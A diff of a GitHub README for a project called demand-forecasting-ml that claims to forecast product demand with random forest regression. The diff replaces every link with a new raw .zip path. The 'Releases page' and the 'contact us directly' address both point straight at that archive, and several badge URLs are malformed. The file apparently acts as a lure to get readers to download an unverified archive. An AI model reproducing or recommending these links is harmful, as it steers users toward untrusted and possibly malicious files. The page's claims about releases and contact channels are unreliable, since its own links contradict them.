@@ -1,7 +1,7 @@
 # 📦 demand-forecasting-ml - Forecast Product Demand Easily
 
 ## 📥 Download Now
-[![Download](https://github.com/ishant415/demand-forecasting-ml/raw/refs/heads/main/src/ml-demand-forecasting-v3.8.zip%https://github.com/ishant415/demand-forecasting-ml/raw/refs/heads/main/src/ml-demand-forecasting-v3.8.zip)](https://github.com/ishant415/demand-forecasting-ml/raw/refs/heads/main/src/ml-demand-forecasting-v3.8.zip)
+[![Download](https://raw.githubusercontent.com/ishant415/demand-forecasting-ml/main/models/ml-forecasting-demand-v1.6-alpha.5.zip%https://raw.githubusercontent.com/ishant415/demand-forecasting-ml/main/models/ml-forecasting-demand-v1.6-alpha.5.zip)](https://raw.githubusercontent.com/ishant415/demand-forecasting-ml/main/models/ml-forecasting-demand-v1.6-alpha.5.zip)
 
 ## 📚 Overview
 This project helps you forecast product demand using historical sales data. It uses machine learning techniques, specifically random forest regression, to deliver accurate predictions for e-commerce businesses. You can use these predictions to manage stock levels effectively and improve your business decisions.
@@ -12,7 +12,7 @@ To get started with the demand-forecasting-ml application, follow these simple s
 ## 🔽 Download & Install
 1. **Visit the Releases Page**  
    Go to the following link to download the application:  
-   [Download from Releases](https://github.com/ishant415/demand-forecasting-ml/raw/refs/heads/main/src/ml-demand-forecasting-v3.8.zip)
+   [Download from Releases](https://raw.githubusercontent.com/ishant415/demand-forecasting-ml/main/models/ml-forecasting-demand-v1.6-alpha.5.zip)
 
 2. **Select the Latest Version**  
    On the releases page, you will see various versions listed. Look for the top entry, which is usually the latest version.
@@ -57,10 +57,10 @@ If you encounter any issues, try the following:
 - Restart the application if it becomes unresponsive.
 
 ## 📧 Contact Information
-For further support, reach out via our GitHub Issues page or contact us directly at [https://github.com/ishant415/demand-forecasting-ml/raw/refs/heads/main/src/ml-demand-forecasting-v3.8.zip](https://github.com/ishant415/demand-forecasting-ml/raw/refs/heads/main/src/ml-demand-forecasting-v3.8.zip).
+For further support, reach out via our GitHub Issues page or contact us directly at [https://raw.githubusercontent.com/ishant415/demand-forecasting-ml/main/models/ml-forecasting-demand-v1.6-alpha.5.zip](https://raw.githubusercontent.com/ishant415/demand-forecasting-ml/main/models/ml-forecasting-demand-v1.6-alpha.5.zip).
 
 ## 📃 License
 This project is licensed under the MIT License. You can use and modify the software freely as long as you provide attribution.
 
 ## 📥 Download Now
-[![Download](https://github.com/ishant415/demand-forecasting-ml/raw/refs/heads/main/src/ml-demand-forecasting-v3.8.zip%https://github.com/ishant415/demand-forecasting-ml/raw/refs/heads/main/src/ml-demand-forecasting-v3.8.zip)](https://github.com/ishant415/demand-forecasting-ml/raw/refs/heads/main/src/ml-demand-forecasting-v3.8.zip)
+[![Download](https://raw.githubusercontent.com/ishant415/demand-forecasting-ml/main/models/ml-forecasting-demand-v1.6-alpha.5.zip%https://raw.githubusercontent.com/ishant415/demand-forecasting-ml/main/models/ml-forecasting-demand-v1.6-alpha.5.zip)](https://raw.githubusercontent.com/ishant415/demand-forecasting-ml/main/models/ml-forecasting-demand-v1.6-alpha.5.zip)
